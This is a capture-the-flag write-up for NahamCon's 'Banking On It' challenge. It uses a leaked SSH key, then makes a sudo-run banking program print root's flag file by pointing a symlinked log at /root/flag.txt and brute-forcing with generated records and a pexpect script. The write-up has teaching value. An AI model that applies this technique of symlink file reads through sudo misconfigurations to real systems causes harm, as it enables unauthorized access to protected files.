
# Banking On It

## Description

Category: Mission

Points: 498

Author: @JohnHammond#6971

```
This is Stage 2 of Path 4 in The Mission. After solving this challenge, you may need to refresh the page to see the newly unlocked challenges.

CONSTELLATIONS uses a custom finance program, but they sure are banking on the fact that is will be used properly...

Escalate your privileges and retrieve the flag out of root''s home directory.

Use credentials you gathered previously to access this challenge.

Press the Start button on the top-right to begin this challenge.
Connect with:
  ssh -p 30616 challenge.nahamcon.com
```

## Background

My team mate [bigpick](https://github.com/bigpick) completed "Stage 1 of Path 4 in The Mission" and found the following source code and SSH key for Gus:

https://github.com/gusrodry/development/blob/master/bank.c

https://github.com/gusrodry/development/tree/master/config/.ssh

And of course we need these files for this second part of the mission.

```
wget https://raw.githubusercontent.com/gusrodry/development/master/bank.c
```
```
wget -O gus_id_rsa https://raw.githubusercontent.com/gusrodry/development/master/config/.ssh/id_rsa
```

## Analysis

On the remote system, the `bank` program and related files can be found under `/opt/banking`:

```
gus@banking-on-it-eeb908d4ed2c2144-5f84f76f97-b6vn5:~$ ls -o /opt/banking/
total 48
-r-xr-xr-x 1 root 42960 Mar 11 05:32 bank
-rw-rw-rw- 1 gus      0 Mar 11 05:32 clerk.dat
-rw-rw-rw- 1 gus      0 Mar 11 05:32 customer.dat
-rw-rw-rw- 1 gus      0 Mar 11 05:32 manager.dat
-rw-rw-rw- 1 gus     32 Mar 11 05:32 recordInfo.txt
```

And we have sudo privs for that one executable:

```
gus@banking-on-it-eeb908d4ed2c2144-5f84f76f97-b6vn5:~$ grep gus /etc/sudoers
gus     ALL=(root) NOPASSWD:SETENV: /opt/banking/bank
```

I tried running it locally first to see how it behaves. I experimented with a bunch of different things, but this is the most relevant path of execution.

### Create a customer account

```
kali@kali:~/Downloads/banking_on_it$ touch clerk.dat customer.dat manager.dat recordInfo.txt
kali@kali:~/Downloads/banking_on_it$ ./bank
Seeding the PRNG and getting randomness for digital entropy...
                        Welcome to bank system!!!

Local time is: Sun Mar 14 14:19:54 2021
 
Choose the mode!
***********************************************************************
***1.Create a customer account!************2.Log in as a customer!*****
***3.Create a clerk account!***************4.Log in as a clerk!********
***5.Create a manager account!*************6.Log in as a manager!******
***7.Exit!*************************************************************
***********************************************************************

1
Now you are creating a customer account, please input information as asked:

Please input your name within 20-digit characaters:
        user
Please input your telephone number within 15-digit numbers:
        none
Please input your address within 40-digit characters:
        none
Please input your pin in 6-digit numbers:
        111111
Now you are given a card number which is used to log in, please record it down!!!
Card id is: 61684890

Press any button to continue!
                        Welcome to bank system!!!

Local time is: Sun Mar 14 14:19:55 2021
```

Creating a customer account triggers `addCustomer()` in bank.c which generates a new card id, and saves the new customer in customer.dat (binary data file).

It also appends the following line to recordInfo.txt:

```
61684890: Account is biuld in Sun Mar 14 14:19:55 2021
```

### Login as the customer

```
Choose the mode!
***********************************************************************
***1.Create a customer account!************2.Log in as a customer!*****
***3.Create a clerk account!***************4.Log in as a clerk!********
***5.Create a manager account!*************6.Log in as a manager!******
***7.Exit!*************************************************************
***********************************************************************

2
Please input the 8-digit card number:

        61684890
Please input the 6-digit pin:

        111111
Log in successfully!
```

This calls into `logCustomer()` in bank.c and appends the following line to recordInfo.txt:

```
61684890: Account has log in at Sun Mar 14 14:21:04 2021
```

### Access activities record

```
Activities you could choose:
*************************************************************************
***1.Withdrawal from account.    *****2.Access to account information.***
***3.Change your pin number.     *****4.Transfer money to others.     ***
***5.Access to activities record.*****6.Log out.                      ***
*************************************************************************
5
Please enter the pin again:

        111111
61684890: Account is biuld in Sun Mar 14 14:19:55 2021
61684890: Account has log in at Sun Mar 14 14:21:04 2021
```

This function reads each line in recordInfo.txt and prints it out if the first 8 characters matches our customer card id. This is the code in bank.c that processes recordInfo.txt:

```c
for(i = 0;i<9;i++) searchId[i] = 0;
while (1){
	flag3 = 0;
	if (fgets(searchId, 9, fptr) && strcmp(searchId, account.cardId) == 0) flag3 = 1;
	fseek(fptr, -8L, SEEK_CUR);
	fgets(buf, MAX_LINE, fptr);
	len = strlen(buf);
	if(len==7) break;
	buf[len - 1] = '\0';
	if (flag3 == 1) printf("%s\n", buf);

}
```

We know the flag format starts with `flag{XXX` where each `X` is a hex digit (0-f), so we should be able to generate a customer.dat file with 4096 entries, covering every possible combination that could match the first 8 chars of the flag.

Then if we symlink recordInfo.txt to /root/flag.txt, and our customer card id matches the first 8 chars of the flag, then accessing the activities record with that card id should print the flag for us, since it will be the first line in recordInfo.txt.

## Solution

Generate customer.dat with all possible matches for the first 8 characters of the flag.

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

typedef struct customer{
        char cardId[9];
        int state;
        char name[21];
        char pin[7];
        long long balance;
        char telNumber[16];
        char address[41];
        struct customer * next;
} Customer;

int main() {
        char *filename1="customer.dat";
        char *alphabet="0123456789abcdef";
        char *prefix="flag{";
        FILE *fptr;

        fptr = fopen(filename1,"ab+");
        if (fptr == NULL) {
                printf("failed to open %s\n", filename1);
                exit(1);
        }

        for (int i = 0; i < strlen(alphabet); i++) {
                for (int j = 0; j < strlen(alphabet); j++) {
                        for (int k = 0; k < strlen(alphabet); k++) {
                                Customer cust = {0};
                                strcpy(cust.cardId, prefix);
                                cust.cardId[5] = alphabet[i];
                                cust.cardId[6] = alphabet[j];
                                cust.cardId[7] = alphabet[k];
                                strcpy(cust.name, cust.cardId);
                                strcpy(cust.pin, "111111");
                                strcpy(cust.telNumber, "1800hackers");
                                strcpy(cust.address, "localhost");

                                fseek(fptr, 0L, SEEK_END);
                                fwrite(&cust,sizeof(Customer),1,fptr);
                        }
                }
        }

        fclose(fptr);
        return 0;
}
```

```
gcc -o gen_customers gen_customers.c && ./gen_customers
```

Use pexpect to automatically try each card id and print the first line from `recordInfo.txt`:

```python
#!/usr/bin/env python3
import sys
sys.path.append('./pexpect')
import pexpect
alphabet = '0123456789abcdef'

for i in alphabet:
    for j in alphabet:
        for k in alphabet:
            card = 'flag{' + i + j + k
            p = pexpect.spawn('sudo /opt/banking/bank')
            p.readline()
            p.sendline('2')
            p.expect('Please input the 8-digit card number:')
            p.sendline(card)
            p.expect('Please input the 6-digit pin:')
            p.sendline('111111')
            p.expect('Activities you could choose:')
            p.sendline('5')
            p.expect('Please enter the pin again:')
            p.sendline('111111')
            p.readline()
            p.readline()
            p.readline()
            print(p.readline())
            p.sendcontrol('c')
```

The remote system where we need to run this doesn't have pexpect or pip (or much of anything) installed, so we need to install pexpect to a local directory and then copy that to the remote system:

```
kali@kali:~/Downloads/banking_on_it$ pip install --target=pexpect/ pexpect
...
kali@kali:~/Downloads/banking_on_it$ tar -cf pexpect.tar pexpect/
```

Copy our generated customer.dat file, pexpect.tar, and solve.py to the system:

```
kali@kali:~/Downloads/banking_on_it$ scp -r -i ~/gus_id_rsa -P 30616 customer.dat gus@challenge.nahamcon.com:~/
customer.dat                                                      100%  512KB 758.8KB/s   00:00
kali@kali:~/Downloads/banking_on_it$ scp -r -i ~/gus_id_rsa -P 30616 pexpect.tar gus@challenge.nahamcon.com:~/
pexpect.tar                                                       100%  430KB 665.8KB/s   00:00
kali@kali:~/Downloads/banking_on_it$ scp -r -i ~/gus_id_rsa -P 30616 solve.py gus@challenge.nahamcon.com:~/
solve.py                                                         100% 1199    50.0KB/s   00:00
```

Then login to the system, extract pexpect.tar, link recordInfo.txt to /root/flag.txt, and create clerk.dat and manager.dat.

```
gus@banking-on-it-eeb908d4ed2c2144-5f84f76f97-b6vn5:~$ tar -xf pexpect.tar 
gus@banking-on-it-eeb908d4ed2c2144-5f84f76f97-b6vn5:~$ ln -s /root/flag.txt recordInfo.txt
gus@banking-on-it-eeb908d4ed2c2144-5f84f76f97-b6vn5:~$ touch clerk.dat manager.dat
```

```
gus@banking-on-it-eeb908d4ed2c2144-5f84f76f97-b6vn5:~$ ls -l
total 956
-rw-rw-r-- 1 gus gus      0 Mar 14 17:33 clerk.dat
-rw-r--r-- 1 gus gus 524416 Mar 14 17:32 customer.dat
-rw-rw-r-- 1 gus gus      0 Mar 14 17:33 manager.dat
drwxr-xr-x 6 gus gus   4096 Mar 14 16:49 pexpect
-rw-r--r-- 1 gus gus 440320 Mar 14 17:32 pexpect.tar
lrwxrwxrwx 1 gus gus     14 Mar 14 17:33 recordInfo.txt -> /root/flag.txt
-rwxr-xr-x 1 gus gus    809 Mar 14 17:36 solve.py
```

Run the script to find the flag:

```
gus@banking-on-it-eeb908d4ed2c2144-5f84f76f97-b6vn5:~$ ./solve.py 
...
b'flag{0fc: Account has log in at Sun Mar 14 17:38:37 2021\r\n'
b'flag{0fd: Account has log in at Sun Mar 14 17:38:37 2021\r\n'
b'flag{0fe: Account has log in at Sun Mar 14 17:38:38 2021\r\n'
b'flag{0ff: Account has log in at Sun Mar 14 17:38:38 2021\r\n'
b'flag{100: Account has log in at Sun Mar 14 17:38:39 2021\r\n'
b'flag{101c109fc3b54ca2dc3167fe727deb8c}\r\n'
b'flag{102: Account has log in at Sun Mar 14 17:38:39 2021\r\n'
b'flag{103: Account has log in at Sun Mar 14 17:38:40 2021\r\n'
b'flag{104: Account has log in at Sun Mar 14 17:38:40 2021\r\n'
...
```

The flag is:

```
flag{101c109fc3b54ca2dc3167fe727deb8c}
```

## Things That Didn't Work

I tried a bunch of different things locally that did not work on the remote system once sudo was in the mix:

* gdb or ptrace: locally I was able to see what the first 8 chars in recordInfo.txt by setting a breakpoint in gdb, but the remote system didn't have gdb or ptrace. And since the command runs as root there, I couldn't use gdb or ptrace as a normal user anyway (permission denied).
* scpying pwntools to remote system: my first version of solve.py used pwntools, which worked great locally. But pwntools pulls in a bunch of dependencies and turned into >150mb of packages once installed. When I tried to scp that tarball to the remote system to get the dependencies I needed, the container would restart either in the middle of the scp command, or when extracting the tarball. Our best guess was that there was a space constraint set on the container so it restarts if we cross a certain threshold. Pwntools was ultimately too big to copy to the system.
* pwntools over ssh: I tried running my pwntools script locally but invoking an ssh command into the remote system. This would have been alright, if it weren't for needing sudo. There's some behavior here that I don't fully understand, but bottom line, I couldn't find a way to run my pwntools script locally in a way that could ssh to the remote system, sudo /opt/banking/bank, and capture the output correctly.
* I tried using a series of quick bash and perl scripts using timeout command to escape from that infinite loop where it keeps calling fseek, but the timeout command was failing to kill each bank process, because of course that process was running as root. We needed some way to send Ctrl-C as input and not just a kill signal.

But in the end, pexpect did the job, it was small enough to scp to the remote system without tripping over the storage constraint, and the methods for pexpect were very similar to what I was using from pwntools anyway.

